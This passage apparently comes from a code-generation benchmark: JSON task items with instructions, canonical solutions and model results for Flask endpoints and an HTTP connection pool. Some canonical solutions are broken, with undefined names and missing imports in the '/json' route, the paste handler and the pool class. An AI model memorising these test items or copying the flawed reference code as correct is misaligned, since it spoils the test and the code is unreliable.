body=body, headers=headers)\n\n        response = conn.getresponse()\n        resp_body = response.read().decode('utf-8')\n\n        logging.debug(\"Received response: %d %s\", response.status, response.reason)\n        logging.debug(\"Response body: %s\", resp_body[:500])  # Log first 500 chars only\n\n        if 200 <= response.status < 300:\n            return resp_body\n        else:\n            error_msg = \"HTTP Error {}: {}\".format(response.status, response.reason)\n            try:\n                error_msg += \" - \" + resp_body\n            except:\n                pass\n            raise Exception(error_msg)\n\n    except (http.client.HTTPException, OSError, ValueError) as e:\n        logging.error(\"Request failed: %s\", str(e), exc_info=True)\n        raise\n    finally:\n        conn.close()"
  },
  {
    "Task_id": 201,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that introduces a configurable delay before responding, with CORS headers enabled for cross-origin requests.\n\nFunction Description: The function creates a Flask route '/respond' that accepts a 'time' query parameter (in milliseconds), sleeps for the specified duration, then returns a simple text response with CORS headers.\n\nInput:\n- time (query parameter): int - The delay time in milliseconds before responding\n\nOutput:\n- Flask Response object containing:\n  - Body: \"Response from Flask\" (string)\n  - Headers: Access-Control-Allow-Origin set to '*' for CORS\n  - Status code: 200 (implicit)",
    "Canonical_solution": "from flask import Flask, request, make_response\nfrom time import sleep\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef hello_world():\n    time_to_sleep = int(request.args.get('time')) / 1000\n    sleep(time_to_sleep)\n    resp = make_response('Response from Flask')\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\nif __name__ == '__main__':\n    app.run()",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, Response\nimport time\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    delay_ms = request.args.get('time', default=0, type=int)\n    time.sleep(delay_ms / 1000.0)\n    response = Response(\"Response from Flask\", status=200)\n    response.headers['Access-Control-Allow-Origin'] = '*'\n    return response\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 202,
    "Instruction": "Task Description: Create a Flask-based HTTP server with multiple endpoints to handle different types of requests and responses, including delayed responses, request type identification, and JSON responses.\n\nFunction Description: The code implements three Flask route handlers that demonstrate different HTTP server functionalities:\n1. `/respond` - Simulates a delayed response based on an input parameter\n2. `/request_type` - Returns the HTTP method used in the request\n3. `/json` - Returns a simple JSON response\n\nInput:\n- For `/respond` endpoint: \n  - `time` (query parameter): Integer - Time in milliseconds to delay the response\n- For `/request_type` endpoint: None\n- For `/json` endpoint: None\n\nOutput:\n- For `/respond` endpoint: \n  - Returns: HTTP response with text \"Response from Flask\" after specified delay\n  - Headers: Sets 'Access-Control-Allow-Origin' to '*'\n- For `/request_type` endpoint:\n  - Returns: HTTP response with text indicating the request method\n  - Headers: Sets 'Access-Control-Allow-Origin' to '*'\n- For `/json` endpoint:\n  - Returns: JSON response with {\"resp\": \"Hello JSON!\"}",
    "Canonical_solution": "from flask import Flask, request, make_response\nfrom time import sleep\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    time_to_sleep = int(request.args.get('time')) / 1000\n    sleep(time_to_sleep)\n    resp = make_response('Response from Flask')\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/request_type')\ndef request_type():\n    resp = make_response('Request Type: ' + request.method)\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/json')\ndef json():\n    return {resp:'Hello JSON!'}",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport time\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    delay = request.args.get('time', default=0, type=int)\n    time.sleep(delay / 1000.0)\n    response = app.make_response('Response from Flask')\n    response.headers['Access-Control-Allow-Origin'] = '*'\n    return response\n\n@app.route('/request_type')\ndef request_type():\n    response = app.make_response(request.method)\n    response.headers['Access-Control-Allow-Origin'] = '*'\n    return response\n\n@app.route('/json')\ndef json_response():\n    return jsonify({\"resp\": \"Hello JSON!\"})\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 203,
    "Instruction": "Task Description: Create a Flask-based web application for sentiment analysis of movie reviews that includes classification, user feedback handling, and data persistence.\n\nClass Description: ReviewClassifier is a Flask web application class that performs sentiment analysis on movie reviews using a pre-trained classifier. It handles user submissions, provides classification results, processes feedback, and stores data in an SQLite database.\n\nAttributes:\n- app: Flask - The Flask application instance\n- clf: sklearn classifier - Pre-trained sentiment classifier loaded from pickle file\n- db: str - Path to the SQLite database file for storing reviews\n\nMethods:\n- __init__() -> None - Initializes the Flask app, loads classifier, and sets up routes\n- _setup_routes() -> None - Configures Flask routes for the web application\n- classify(document: str) -> tuple[str, float] - Classifies a review document and returns (label, probability)\n- train(document: str, y: int) -> None - Updates classifier with new training data\n- sqlite_entry(document: str, y: int) -> None - Stores review and sentiment in database\n- index() -> str - Renders the main review submission form (HTML)\n- results() -> str - Processes form submission and renders classification results (HTML)\n- feedback() -> str - Handles user feedback and updates model/database (HTML)\n- run(debug: bool = True) -> None - Starts the Flask development server",
    "Canonical_solution": "from flask import Flask, request, render_template\nfrom wtforms import Form, TextAreaField, validators\nimport pickle\nimport sqlite3\nimport os\nimport numpy as np\nfrom vectorizer import vect\n\nclass ReviewClassifier:\n    def __init__(self):\n        self.app = Flask(__name__)\n        cur_dir = os.path.dirname(__file__)\n        self.clf = pickle.load(open(os.path.join(cur_dir, 'pkl_objects', 'classifier.pkl'), 'rb'))\n        self.db = os.path.join(cur_dir, 'reviews.sqlite')\n        self._setup_routes()\n\n    def _setup_routes(self):\n        self.app.route('/')(self.index)\n        self.app.route('/results', methods=['POST'])(self.results)\n        self.app.route('/thanks', methods=['POST'])(self.feedback)\n\n    def classify(self, document):\n        label = {0: 'negative', 1: 'positive'}\n        X = vect.transform([document])\n        y = self.clf.predict(X)[0]\n        proba = np.max(self.clf.predict_proba(X))\n        return label[y], proba\n\n    def train(self, document, y):\n        X = vect.transform([document])\n        self.clf.partial_fit(X, [y])\n\n    def sqlite_entry(self, document, y):\n        conn = sqlite3.connect(self.db)\n        c = conn.cursor()\n        c.execute(\"INSERT INTO review_db (review, sentiment, date) VALUES (?, ?, DATETIME('now'))\", (document, y))\n        conn.commit()\n        conn.close()\n\n    def index(self):\n        form = ReviewForm(request.form)\n        return render_template('reviewform.html', form=form)\n\n    def results(self):\n        form = ReviewForm(request.form)\n        if request.method == 'POST' and form.validate():\n            review = request.form['moviereview']\n            y, proba = self.classify(review)\n            return render_template('results.html',\n                                  content=review,\n                                  prediction=y,\n                                  probability=round(proba*100, 2))\n        return render_template('reviewform.html', form=form)\n\n    def feedback(self):\n        feedback = request.form['feedback_button']\n        review = request.form['review']\n        prediction = request.form['prediction']\n\n        inv_label = {'negative': 0, 'positive': 1}\n        y = inv_label[prediction]\n        if feedback == 'Incorrect':\n            y = int(not(y))\n        self.train(review, y)\n        self.sqlite_entry(review, y)\n        return render_template('thanks.html')\n\n    def run(self, debug=True):\n        self.app.run(debug=debug)\n\nclass ReviewForm(Form):\n    moviereview = TextAreaField('',\n                              [validators.DataRequired(),\n                               validators.length(min=15)])",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "import os\nimport pickle\nfrom flask import Flask, render_template, request, redirect, url_for\nimport sqlite3\nimport numpy as np\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.linear_model import LogisticRegression\n\nclass ReviewClassifier:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.clf = self._load_classifier()\n        self.db = 'reviews.db'\n        self._setup_routes()\n        self._init_db()\n\n    def _load_classifier(self):\n        with open('classifier.pkl', 'rb') as f:\n            return pickle.load(f)\n\n    def _setup_routes(self):\n        @self.app.route('/')\n        def index():\n            return self.index()\n\n        @self.app.route('/results', methods=['POST'])\n        def results():\n            return self.results()\n\n        @self.app.route('/feedback', methods=['POST'])\n        def feedback():\n            return self.feedback()\n\n    def classify(self, document):\n        prob = self.clf.predict_proba([document])[0]\n        label = self.clf.predict([document])[0]\n        return label, max(prob)\n\n    def train(self, document, y):\n        X = [document]\n        y = [y]\n        self.clf.partial_fit(X, y)\n\n    def sqlite_entry(self, document, y):\n        conn = sqlite3.connect(self.db)\n        c = conn.cursor()\n        c.execute(\"INSERT INTO reviews (review, sentiment) VALUES (?, ?)\", (document, y))\n        conn.commit()\n        conn.close()\n\n    def _init_db(self):\n        with self.app.app_context():\n            conn = sqlite3.connect(self.db)\n            c = conn.cursor()\n            c.execute('''CREATE TABLE IF NOT EXISTS reviews\n                         (id INTEGER PRIMARY KEY AUTOINCREMENT,\n                          review TEXT NOT NULL,\n                          sentiment INTEGER NOT NULL)''')\n            conn.commit()\n            conn.close()\n\n    def index(self):\n        return render_template('form.html')\n\n    def results(self):\n        review = request.form['review']\n        label, prob = self.classify(review)\n        sentiment_map = {0: 'Negative', 1: 'Positive'}\n        label_str = sentiment_map[label]\n        return render_template('results.html', review=review, label=label_str, probability=prob)\n\n    def feedback(self):\n        review = request.form['review']\n        correct_label = int(request.form['correct_label'])\n        self.train(review, correct_label)\n        self.sqlite_entry(review, correct_label)\n        return redirect(url_for('index'))\n\n    def run(self, debug=True):\n        self.app.run(debug=debug)"
  },
  {
    "Task_id": 204,
    "Instruction": "Task Description: Create a simple HTTP server using Flask that handles GET requests on a specific endpoint and returns a response.\n\nFunction Description: The function `server_request` is a Flask route handler that processes incoming GET requests to the \"/server_request\" endpoint. It retrieves a query parameter named \"param\" from the request, prints it to the console, and returns a simple response string \"served\".\n\nInput: \n- The function receives an implicit Flask `request` object containing the HTTP request data.\n- The input parameter is passed as a query string parameter named \"param\" (e.g., \"/server_request?param=value\").\n\nOutput: \n- The function prints the value of the \"param\" query parameter to the console.\n- The function returns a string response \"served\" with HTTP status code 200.",
    "Canonical_solution": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route(\"/server_request\")\ndef server_request():\n    print(request.args.get(\"param\"))\n    return \"served\"\n\nif __name__ == \"__main__\":\n    app.run(port=8082)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/server_request', methods=['GET'])\ndef server_request():\n    param_value = request.args.get('param')\n    print(param_value)\n    return 'served', 200\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 205,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that processes Pub/Sub push subscription messages, extracts relevant data, and inserts it into BigQuery. Handle errors gracefully and return appropriate HTTP responses.\n\nFunction Description: The function serves as a Flask route handler for POST requests at the root path (\"/\"). It processes incoming Pub/Sub messages, extracts attributes and message data, processes Cloud Build events if present, and inserts the processed data into BigQuery. Errors are logged and a 204 No Content response is returned upon successful processing.\n\nInput: \n- HTTP POST request with JSON payload containing Pub/Sub message format:\n  {\n    \"message\": {\n      \"attributes\": {\n        \"key1\": \"value1\",\n        \"buildId\": \"123\" (optional)\n      },\n      \"data\": \"base64-encoded-string\" (optional)\n    }\n  }\n\nOutput: \n- Returns HTTP 204 No Content response on successful processing\n- Raises exceptions for invalid payload formats or missing required fields\n- Logs errors to console when data cannot be saved to BigQuery",
    "Canonical_solution": "import base64\nimport os\nimport json\nimport shared\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route(\"/\", methods=[\"POST\"])\ndef index():\n    \"\"\"\n    Receives messages from a push subscription from Pub/Sub.\n    Parses the message, and inserts it into BigQuery.\n    \"\"\"\n    event = None\n    if not request.is_json:\n        raise Exception(\"Expecting JSON payload\")\n    envelope = request.get_json()\n\n    if \"message\" not in envelope:\n        raise Exception(\"Not a valid Pub/Sub Message\")\n    msg = envelope[\"message\"]\n\n    if \"attributes\" not in msg:\n        raise Exception(\"Missing pubsub attributes\")\n\n    try:\n        attr = msg[\"attributes\"]\n        if \"buildId\" in attr:\n            event = process_cloud_build_event(attr, msg)\n\n        shared.insert_row_into_bigquery(event)\n\n    except Exception as e:\n        entry = {\n                \"severity\": \"WARNING\",\n                \"msg\": \"Data not saved to BigQuery\",\n                \"errors\": str(e),\n                \"json_payload\": envelope\n            }\n        print(json.dumps(entry))\n\n    return \"\", 204",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "import base64\nimport json\nimport logging\nfrom flask import Flask, request\nfrom google.cloud import bigquery\n\napp = Flask(__name__)\nclient = bigquery.Client()\ntable_id = 'your-project.your_dataset.your_table'\n\nlogging.basicConfig(level=logging.INFO)\n\ndef process_cloudbuild_event(data):\n    return {\n        'status': data.get('status'),\n        'startTime': data.get('startTime'),\n        'finishTime': data.get('finishTime'),\n        'logUrl': data.get('logUrl'),\n        'projectId': data.get('projectId'),\n        'id': data.get('id'),\n        'number': data.get('number'),\n        'builderImage': data.get('builderImage'),\n        'sourceProvenance': json.dumps(data.get('sourceProvenance')),\n        'triggerId': data.get('triggerId'),\n        'buildStepImages': json.dumps(data.get('results', {}).get('images')),\n        'buildStatus': data.get('statusDetail')\n    }\n\n@app.route('/', methods=['POST'])\ndef index():\n    envelope = request.get_json()\n    if not envelope:\n        raise ValueError(\"No JSON payload received\")\n\n    if \"message\" not in envelope:\n        raise ValueError(\"Missing 'message' key in Pub/Sub message\")\n\n    pubsub_message = envelope['message']\n\n    try:\n        attributes = pubsub_message.get('attributes', {})\n        build_id = attributes.get('buildId')\n\n        if not build_id:\n            raise ValueError(\"Missing 'buildId' attribute in message\")\n\n        data = {}\n        if 'data' in pubsub_message:\n            payload = base64.b64decode(pubsub_message['data']).decode('utf-8').strip()\n            if payload:\n                data = json.loads(payload)\n\n        processed_data = process_cloudbuild_event(data)\n        processed_data['buildId'] = build_id\n\n        errors = client.insert_rows_json(table_id, [processed_data])\n        if errors:\n            raise RuntimeError(f\"BigQuery insert errors: {errors}\")\n\n    except Exception as e:\n        logging.error(f\"Error processing message: {e}\", exc_info=True)\n        return {\"error\": str(e)}, 500\n\n    return '', 204\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8080)"
  },
  {
    "Task_id": 206,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that handles image pasting functionality, including image processing, screen projection detection, and integration with Photoshop.\n\nFunction Description: The paste() function handles POST requests to the '/paste' endpoint. It receives an image file, processes it to find matching screen coordinates, and sends it to Photoshop at the detected location. The function includes error handling, logging, and returns appropriate JSON responses.\n\nInput:\n- HTTP POST request containing:\n  - 'data' file: [binary] - Image file to be processed and pasted\n- Optional command line argument:\n  - '--photoshop_password': [str] - Password for Photoshop integration (default: '123456')\n\nOutput:\n- JSON response containing:\n  - 'status': [str] - Operation result ('ok', 'error', or 'screen not found')\n  - Optional 'error': [str] - Error description if status is 'error'\n- Possible HTTP status codes:\n  - 200: Successful operation\n  - 400: Bad request (missing file or empty image)",
    "Canonical_solution": "import io\nimport os\nfrom flask import Flask, request, jsonify, send_file\nfrom flask_cors import CORS\nimport logging\nimport argparse\nimport ps\n\nlogging.basicConfig(level=logging.INFO)\n\nparser = argparse.ArgumentParser()\nparser.add_argument('--photoshop_password', default='123456')\nargs = parser.parse_args()\n\napp = Flask(__name__)\nCORS(app)\n\n@app.route('/paste', methods=['POST'])\ndef paste():\n    start = time.time()\n    logging.info(' PASTE')\n\n    if 'data' not in request.files:\n        return jsonify({\n            'status': 'error',\n            'error': 'missing file param `data`'\n        }), 400\n    data = request.files['data'].read()\n    if len(data) == 0:\n        return jsonify({'status:': 'error', 'error': 'empty image'}), 400\n\n    with open('paste_received.jpg', 'wb') as f:\n        f.write(data)\n\n    view = Image.open(io.BytesIO(data))\n\n    if view.size[0] > max_view_size or view.size[1] > max_view_size:\n        view.thumbnail((max_view_size, max_view_size))\n\n    logging.info(' > grabbing screenshot...')\n    screen = pyscreenshot.grab()\n    screen_width, screen_height = screen.size\n\n    if screen.size[0] > max_screenshot_size or screen.size[1] > max_screenshot_size:\n        screen.thumbnail((max_screenshot_size, max_screenshot_size))\n\n    logging.info(' > finding projected point...')\n    view_arr = np.array(view.convert('L'))\n    screen_arr = np.array(screen.convert('L'))\n    x, y = screenpoint.project(view_arr, screen_arr, False)\n\n    found = x != -1 and y != -1\n\n    if found:\n        x = int(x / screen.size[0] * screen_width)\n        y = int(y / screen.size[1] * screen_height)\n        logging.info(f'{x}, {y}')\n\n        logging.info(' > sending to photoshop...')\n        name = datetime.today().strftime('%Y-%m-%d-%H:%M:%S')\n        img_path = os.path.join(os.getcwd(), 'cut_current.png')\n        err = ps.paste(img_path, name, x, y, password=args.photoshop_password)\n        if err is not None:\n            logging.error('error sending to photoshop')\n            logging.error(err)\n            jsonify({'status': 'error sending to photoshop'})\n    else:\n        logging.info('screen not found')\n\n    logging.info(f'Completed in {time.time() - start:.2f}s')\n\n    if found:\n        return jsonify({'status': 'ok'})\n    else:\n        return jsonify({'status': 'screen not found'})",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport argparse\nimport logging\nimport os\nfrom PIL import Image\nimport io\nimport numpy as np\nimport cv2\nimport pyautogui\nimport subprocess\n\napp = Flask(__name__)\nlogging.basicConfig(level=logging.INFO)\n\ndef find_screen_projection(image_array):\n    screen_width, screen_height = pyautogui.size()\n    screen_img = pyautogui.screenshot()\n    screen_img = cv2.cvtColor(np.array(screen_img), cv2.COLOR_RGB2BGR)\n    \n    gray_screen = cv2.cvtColor(screen_img, cv2.COLOR_BGR2GRAY)\n    gray_image = cv2.cvtColor(image_array, cv2.COLOR_BGR2GRAY)\n    \n    result = cv2.matchTemplate(gray_screen, gray_image, cv2.TM_CCOEFF_NORMED)\n    threshold = 0.8\n    loc = np.where(result >= threshold)\n    \n    if len(loc[0]) > 0:\n        return (int(loc[1][0] + gray_image.shape[1]/2), \n                int(loc[0][0] + gray_image.shape[0]/2))\n    return None\n\ndef send_to_photoshop(image_path, coordinates, password='123456'):\n    try:\n        ps_script = f\"\"\"\n        var doc = app.open(\"{image_path}\");\n        var x = {coordinates[0]};\n        var y = {coordinates[1]};\n        doc.selection.selectAll();\n        doc.selection.copy();\n        doc.close(SaveOptions.DONOTSAVECHANGES);\n        var targetDoc = app.activeDocument;\n        targetDoc.paste();\n        \"\"\"\n        \n        process = subprocess.Popen(\n            ['photoshop', '--run', ps_script],\n            stdin=subprocess.PIPE,\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            universal_newlines=True\n        )\n        \n        stdout, stderr = process.communicate(input=password)\n        if process.returncode != 0:\n            raise Exception(f\"Photoshop error: {stderr}\")\n        return True\n    except Exception as e:\n        logging.error(f\"Photoshop integration failed: {e}\")\n        return False\n\n@app.route('/paste', methods=['POST'])\ndef paste():\n    if 'data' not in request.files:\n        return jsonify({'status': 'error', 'error': 'Missing file'}), 400\n    \n    file = request.files['data']\n    if file.filename == '':\n        return jsonify({'status': 'error', 'error': 'Empty image'}), 400\n    \n    try:\n        img = Image.open(file.stream)\n        img_array = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)\n        \n        if img_array.size == 0:\n            return jsonify({'status': 'error', 'error': 'Invalid image data'}), 400\n        \n        coordinates = find_screen_projection(img_array)\n        if not coordinates:\n            return jsonify({'status': 'screen not found'}), 200\n        \n        temp_path = os.path.join(os.getcwd(), \"temp_image_for_ps.png\")\n        cv2.imwrite(temp_path, img_array)\n        \n        photoshop_password = request.args.get('--photoshop_password', default='123456')\n        \n        if not send_to_photoshop(temp_path, coordinates, photoshop_password):\n            return jsonify({'status': 'error', 'error': 'Failed to send to Photoshop'}), 500\n        \n        os.remove(temp_path)\n        return jsonify({'status': 'ok'}), 200\n        \n    except Exception as e:\n        logging.error(f\"Error processing request: {e}\")\n        return jsonify({'status': 'error', 'error': str(e)}), 500\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--photoshop_password', type=str, default='123456',\n                        help='Password for Photoshop integration')\n    parser.add_argument('--port', type=int, default=5000,\n                        help='Port number for the server')\n    args = parser.parse_args()\n    \n    app.run(host='0.0.0.0', port=args.port)"
  },
  {
    "Task_id": 207,
    "Instruction": "Task Description: Create a Flask-based HTTP server with multiple endpoints to handle different types of requests, including delayed responses, request type identification, and JSON responses.\n\nFunction Description: The code implements three Flask route handlers that demonstrate different HTTP server functionalities. Each function handles a specific endpoint and performs a distinct operation.\n\nInput:\n- For '/respond' endpoint: \n  - Query parameter 'time' (integer): Milliseconds to sleep before responding\n- For '/request_type' endpoint: \n  - None (implicitly receives HTTP request method)\n- For '/json' endpoint: \n  - None\n\nOutput:\n- For '/respond' endpoint: \n  - HTTP response with text body after specified delay\n  - Sets CORS header to allow all origins\n- For '/request_type' endpoint: \n  - HTTP response indicating the request method type\n  - Sets CORS header to allow all origins\n- For '/json' endpoint: \n  - Automatic JSON response with greeting message",
    "Canonical_solution": "from flask import Flask, request, make_response\nfrom time import sleep\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    time_to_sleep = int(request.args.get('time')) / 1000\n    sleep(time_to_sleep)\n    resp = make_response('Response from Flask')\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/request_type')\ndef request_type():\n    resp = make_response('Request Type: ' + request.method)\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/json')\ndef json():\n    return {resp:'Hello JSON!'}",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport time\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    delay = int(request.args.get('time', 0)) / 1000.0\n    time.sleep(delay)\n    response = app.response_class(\n        response='Request completed after delay',\n        status=200\n    )\n    response.headers['Access-Control-Allow-Origin'] = '*'\n    return response\n\n@app.route('/request_type')\ndef request_type():\n    method = request.method\n    response = app.response_class(\n        response=f'Received {method} request',\n        status=200\n    )\n    response.headers['Access-Control-Allow-Origin'] = '*'\n    return response\n\n@app.route('/json')\ndef json_response():\n    return jsonify(message='Hello from server')\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 21,
    "Instruction": "Task Description: Implement a connection pooling system for HTTP and HTTPS connections to efficiently manage and reuse connections to a target server.\n\nClass Description: HTTPConnectionPool is a connection pool implementation that manages HTTP connections to a specific host and port. It provides methods to get, put, and make requests using connections from the pool.\n\nAttributes:\n- scheme: str - The URL scheme (http or https)\n- host: str - The target host for connections\n- port: int - The target port for connections\n- timeout: Timeout - Connection and read timeout settings\n- retries: Retry - Retry configuration for failed requests\n- pool: LifoQueue - The connection pool storage (LIFO queue)\n- block: bool - Whether to block when pool is empty\n- proxy: str - Proxy server URL (optional)\n- proxy_headers: dict - Headers for proxy requests\n\nMethods:\n- __init__(host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None - Initializes the connection pool with configuration parameters\n- _new_conn() -> HTTPConnection - Creates a new connection instance\n- _get_conn(timeout=None) -> HTTPConnection - Gets a connection from the pool or creates a new one\n- _put_conn(conn) -> None - Returns a connection to the pool\n- _make_request(conn, method, url, timeout=_Default, **httplib_request_kw) -> HTTPResponse - Makes an HTTP request using the specified connection\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, **response_kw) -> HTTPResponse - Main method to make HTTP requests with connection pooling and retry logic\n- close() -> None - Closes all connections in the pool\n\nClass Description: HTTPSConnectionPool extends HTTPConnectionPool to handle HTTPS connections with SSL/TLS configuration.\n\nAttributes:\n- key_file: str - Path to client private key file\n- cert_file: str - Path to client certificate file\n- cert_reqs: str - Certificate requirements\n- ca_certs: str - Path to CA certificates file\n- ssl_version: str - SSL version to use\n- assert_hostname: str - Hostname to verify against certificate\n- assert_fingerprint: str - Expected certificate fingerprint\n\nMethods:\n- _prepare_conn(conn) -> HTTPSConnection - Configures SSL/TLS settings on a connection\n- _new_conn() -> HTTPSConnection - Creates a new HTTPS connection with SSL/TLS configuration",
    "Canonical_solution": "import socket\nimport errno\nfrom socket import error as SocketError\nfrom socket import timeout as SocketTimeout\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .util.timeout import Timeout\nfrom .util.retry import Retry\nfrom .util.url import parse_url\nfrom .exceptions import (\n    EmptyPoolError,\n    HostChangedError,\n    MaxRetryError,\n    ProtocolError,\n    ProxyError,\n    SSLError,\n    TimeoutError,\n    ClosedPoolError,\n    NewConnectionError\n)\nfrom .packages import six\nfrom .packages.six.moves import queue\nfrom .util.queue import LifoQueue\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        strict=False,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        **conn_kw\n    ):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries\n        self.pool = LifoQueue(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            strict=self.strict,\n            **self.conn_kw\n        )\n\n    def _get_conn(self, timeout=None):\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n            if conn and is_connection_dropped(conn):\n                conn.close()\n                conn = None\n            return conn or self._new_conn()\n        except queue.Empty:\n            raise EmptyPoolError(self, \"Pool is empty.\")\n\n    def _put_conn(self, conn):\n        try:\n            self.pool.put(conn, block=False)\n        except queue.Full:\n            conn.close()\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        timeout_obj = self._get_timeout(timeout)\n        conn.timeout = timeout_obj.connect_timeout\n        conn.request(method, url, **httplib_request_kw)\n        return conn.getresponse()\n\n    def urlopen(\n        self,\n        method,\n        url,\n        body=None,\n        headers=None,\n        retries=None,\n        redirect=True,\n        assert_same_host=True,\n        timeout=_Default,\n        pool_timeout=None,\n        release_conn=None,\n        **response_kw\n    ):\n        if retries is None:\n            retries = self.retries\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries)\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._get_conn(timeout=pool_timeout)\n            conn.timeout = timeout_obj.connect_timeout\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers\n            )\n            response = self.ResponseCls.from_httplib(\n                httplib_response,\n                pool=self,\n                connection=conn,\n                retries=retries,\n                **response_kw\n            )\n            return response\n        except (SocketError, ProtocolError) as e:\n            retries = retries.increment(method, url, error=e, _pool=self)\n            retries.sleep()\n            return self.urlopen(\n                method,\n                url,\n                body,\n                headers,\n                retries,\n                redirect,\n                assert_same_host,\n                timeout,\n                pool_timeout,\n                release_conn,\n                **response_kw\n            )\n\n    def close(self):\n        while True:\n            try:\n                conn = self.pool.get(block=False)\n                conn.close()\n            except queue.Empty:\n                break\n\nclass HTTPSConnectionPool(HTTPConnectionPool):\n    scheme = \"https\"\n    ConnectionCls = HTTPSConnection\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        strict=False,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        key_file=None,\n        cert_file=None,\n        cert_reqs=None,\n        ca_certs=None,\n        ssl_version=None,\n        assert_hostname=None,\n        assert_fingerprint=None,\n        **conn_kw\n    ):\n        super(HTTPSConnectionPool, self).__init__(\n            host,\n            port,\n            strict,\n            timeout,\n            maxsize,\n            block,\n            headers,\n            retries,\n            _proxy,\n            _proxy_headers,\n            **conn_kw\n        )\n        self.key_file = key_file\n        self.cert_file = cert_file\n        self.cert_reqs = cert_reqs\n        self.ca_certs = ca_certs\n        self.ssl_version = ssl_version\n        self.assert_hostname = assert_hostname\n        self.assert_fingerprint = assert_fingerprint\n\n    def _prepare_conn(self, conn):\n        conn.set_cert(\n            key_file=self.key_file,\n            cert_file=self.cert_file,\n            cert_reqs=self.cert_reqs,\n            ca_certs=self.ca_certs,\n            assert_hostname=self.assert_hostname,\n            assert_fingerprint=self.assert_fingerprint\n        )\n        conn.ssl_version = self.ssl_version\n        return conn\n\n    def _new_conn(self):\n        conn = super(HTTPSConnectionPool, self)._new_conn()\n        return self._prepare_conn(conn)",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "right_result": "import socket\nfrom http.client import HTTPConnection, HTTPSConnection, HTTPResponse\nfrom queue import LifoQueue, Full, Empty\nfrom urllib.parse import urlparse\nimport ssl\nimport time\n\nclass Timeout:\n    DEFAULT_TIMEOUT = 5.0\n\n    def __init__(self, connect=DEFAULT_TIMEOUT, read=DEFAULT_TIMEOUT):\n        self.connect = connect\n        self.read = read\n\n    def __repr__(self):\n        return f\"Timeout(connect={self.connect}, read={self.read})\"\n\nclass Retry:\n    def __init__(self, total=3, backoff_factor=0.5):\n        self.total = total\n        self.backoff_factor = backoff_factor\n\nclass HTTPConnectionPool:\n    def __init__(self, host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw):\n        if isinstance(timeout, (int, float)):\n            timeout = Timeout(connect=timeout, read=timeout)\n        \n        self.scheme = 'http'\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries if retries is not None else Retry()\n        self.pool = LifoQueue(maxsize=maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        